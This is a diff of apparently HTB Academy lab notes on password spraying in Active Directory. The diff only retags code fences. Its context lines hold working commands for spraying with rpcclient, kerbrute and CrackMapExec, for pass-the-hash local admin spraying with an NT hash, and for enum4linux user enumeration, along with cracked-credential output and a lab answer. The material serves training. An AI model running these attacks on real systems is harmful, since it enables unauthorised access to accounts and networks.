@@ -3,7 +3,7 @@
 ### Using a Bash one-liner for the Attack
 An important consideration is that a valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login. We can filter out invalid login attempts by `grepping` for `Authority` in the response. 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 
 Account Name: tjohnson, Authority Name: INLANEFREIGHT
@@ -12,7 +12,7 @@ Account Name: sgage, Authority Name: INLANEFREIGHT
 
 ### Using Kerbrute for the Attack
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 
     __             __               __     
@@ -33,7 +33,7 @@ Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
 
 ### Using CrackMapExec & Filtering Logon Failures
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
@@ -41,7 +41,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avaz
 
 ### Validating the Credentials with CrackMapExec
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -54,7 +54,7 @@ Sometimes we may only retrieve the NTLM hash for the local administrator account
 In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.`
 
 #### Local Admin Spraying with CrackMapExec
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
 SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
@@ -71,7 +71,7 @@ SSH to **10.129.35.26** (ACADEMY-EA-ATTACK01), with user `htb-student` and passw
 1. Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer. **Answer: sgage**
    - `ssh htb-student@10.129.35.26` → SSH to the target machine
    - Identify DC IP address:
-        ```sh
+        ```shellsession
         $ping -c1 inlanefreight.local
         PING inlanefreight.local (172.16.5.5) 56(84) bytes of data.
         64 bytes from inlanefreight.local (172.16.5.5): icmp_seq=1 ttl=128 time=0.461 ms
@@ -82,7 +82,7 @@ SSH to **10.129.35.26** (ACADEMY-EA-ATTACK01), with user `htb-student` and passw
         ```
    - `$enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > valid_users.txt` → Enumerate for valid users using SMB NULL Session
    - Password spraying using `rpclient`:
-        ```sh
+        ```shellsession
         $for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
         Account Name: sgage, Authority Name: INLANEFREIGHT
         Account Name: mholliday, Authority Name: INLANEFREIGHT
